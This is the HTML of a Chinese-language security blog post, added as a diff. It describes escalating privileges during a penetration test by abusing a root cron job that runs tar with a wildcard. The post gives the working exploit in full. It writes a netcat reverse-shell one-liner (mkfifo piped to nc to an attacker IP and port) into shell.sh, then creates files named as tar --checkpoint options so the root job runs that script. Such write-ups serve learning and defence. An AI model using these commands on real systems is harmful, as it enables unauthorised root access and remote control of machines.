@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="故事背景前情提要在某一次渗透的过程中，已经通过CMS的漏洞拿到了目标机器的shell，但是只是一个普通权限，需要提权。 提权在连接之后，用catt &#x2F;etc&#x2F;crontab可以看到主机上是有计划任务的，而这个计划任务是执行一个backup.sh的脚本，从名字不难推出，是对站点做定期更新的。而这个脚本对应的user是root，并且每分钟都会自动执行一次。 这就给了我们一些提权的发挥空间。  查看这个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用tar利用通配符提权">
+<meta property="og:url" content="http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Where Lothar Writes Blogs">
+<meta property="og:description" content="故事背景前情提要在某一次渗透的过程中，已经通过CMS的漏洞拿到了目标机器的shell，但是只是一个普通权限，需要提权。 提权在连接之后，用catt &#x2F;etc&#x2F;crontab可以看到主机上是有计划任务的，而这个计划任务是执行一个backup.sh的脚本，从名字不难推出，是对站点做定期更新的。而这个脚本对应的user是root，并且每分钟都会自动执行一次。 这就给了我们一些提权的发挥空间。  查看这个">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/NUC/OneDrive/文档/image-20231006213540224.png">
+<meta property="article:published_time" content="2023-10-06T14:13:25.000Z">
+<meta property="article:modified_time" content="2023-10-06T14:14:17.790Z">
+<meta property="article:author" content="Lothar">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/NUC/OneDrive/文档/image-20231006213540224.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>使用tar利用通配符提权</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/07/19/%E6%A8%A1%E7%B3%8A%E5%93%88%E5%B8%8C/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&text=使用tar利用通配符提权"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&is_video=false&description=使用tar利用通配符提权"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=使用tar利用通配符提权&body=Check out this article: http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&name=使用tar利用通配符提权&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&t=使用tar利用通配符提权"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%85%E4%BA%8B%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">故事背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">前情提要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E5%85%B3%E4%BA%8E%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">Linux下关于通配符的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E8%AF%B4%E6%9D%A5"><span class="toc-number">1.4.</span> <span class="toc-text">总体说来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tar"><span class="toc-number">1.5.</span> <span class="toc-text">tar</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E6%95%85%E4%BA%8B"><span class="toc-number">2.</span> <span class="toc-text">回到故事</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text">正式提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        使用tar利用通配符提权
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Lothar</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-06T14:13:25.000Z" itemprop="datePublished">2023-10-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Attacks/">Attacks</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h2><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><p>在某一次渗透的过程中，已经通过CMS的漏洞拿到了目标机器的shell，但是只是一个普通权限，需要提权。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在连接之后，用<code>catt /etc/crontab</code>可以看到主机上是有计划任务的，而这个计划任务是执行一个<code>backup.sh</code>的脚本，从名字不难推出，是对站点做定期更新的。而这个脚本对应的user是root，并且每分钟都会自动执行一次。</p>
+<p>这就给了我们一些提权的发挥空间。</p>
+<p><img src="C:\Users\NUC\OneDrive\文档\image-20231006213540224.png" alt="image-20231006213540224"></p>
+<p>查看这个<code>backup.sh</code>的内容如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">cd /var/www/html</span><br><span class="line">tar cf /home/xxxxxxx/backups/backup.tgz *</span><br></pre></td></tr></table></figure>
+
+<p>不难看出，这个脚本会用tar来打包<code>/var/www/html</code>下的所有文件，并使用了一个通配符来实现的。而恰恰是这个通配符帮助了我们提权。</p>
+<h3 id="Linux下关于通配符的利用"><a href="#Linux下关于通配符的利用" class="headerlink" title="Linux下关于通配符的利用"></a>Linux下关于通配符的利用</h3><h3 id="总体说来"><a href="#总体说来" class="headerlink" title="总体说来"></a>总体说来</h3><p>通配符其实在Linux的命令中很常见，对于大多数用户来说，它是一个很好用很方便的特性而不是一个bug。</p>
+<p>但是从安全的角度讲，在使用比如<strong>chown</strong>, <strong>tar</strong>, <strong>rsync</strong>等操作的特定选项时，可能会出现安全问题。使用精心设计的文件名，攻击者可以在shell命令中注入参数，从而让root来帮助他执行命令。</p>
+<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>我们以tar来举例。 tar有两个参数可以被用来注入：</p>
+<p><code>--checkpoint[=NUMBER]</code> - 在执行到第NUMBER个记录的时候展示进度信息（默认为10）</p>
+<p><code>--checkpoint-action=ACTION</code> - 在每个checkpoint执行ACTION</p>
+<p>从设计初衷的角度出发，这两个参数使得tar可以在每个checkpoint触发时执行特定的操作。但从恶意的角度看来，它们使得任意命令执行成为可能，而且是以运行tar命令的用户的身份。</p>
+<p>正常来说，当我们想要打包一个目录下的所有文件时，我们会使用通配符。</p>
+<p><code>tar cf xxxx.tar *</code></p>
+<p>但是如果我们的目录下有这样的几个文件呢？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-–checkpoint=1</span><br><span class="line">–-checkpoint-action=exec=sh shell.sh</span><br><span class="line">shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>前面两个就是我们刚才提到的文件，最后一个则是一个shell的脚本。</p>
+<p>因为使用了通配符，它们也会被放到命令中去，但<strong>不是以文件的形式，而是会被识别为tar的参数</strong>。从而使得<code>shell.sh</code>得以执行。</p>
+<h2 id="回到故事"><a href="#回到故事" class="headerlink" title="回到故事"></a>回到故事</h2><h3 id="正式提权"><a href="#正式提权" class="headerlink" title="正式提权"></a>正式提权</h3><p>结合刚才对通配符的分析，利用方式其实已经很明了了。</p>
+<p>输入以下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 1234 &gt;/tmp/f&quot; &gt; shell.sh</span><br><span class="line">touch &quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">touch &quot;/var/www/html/--checkpoint=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后在本机上监听1234端口，稍作等待即可收到root shell。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[Exploiting wildcards on Linux](</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/categories/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%85%E4%BA%8B%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">故事背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">前情提要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E5%85%B3%E4%BA%8E%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">Linux下关于通配符的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E8%AF%B4%E6%9D%A5"><span class="toc-number">1.4.</span> <span class="toc-text">总体说来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tar"><span class="toc-number">1.5.</span> <span class="toc-text">tar</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E6%95%85%E4%BA%8B"><span class="toc-number">2.</span> <span class="toc-text">回到故事</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text">正式提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&text=使用tar利用通配符提权"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&is_video=false&description=使用tar利用通配符提权"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=使用tar利用通配符提权&body=Check out this article: http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&title=使用tar利用通配符提权"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&name=使用tar利用通配符提权&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://lotharshi.github.io/2023/10/06/%E4%BD%BF%E7%94%A8tar%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/&t=使用tar利用通配符提权"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Lothar
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RJJPDKLTJM"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-RJJPDKLTJM');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
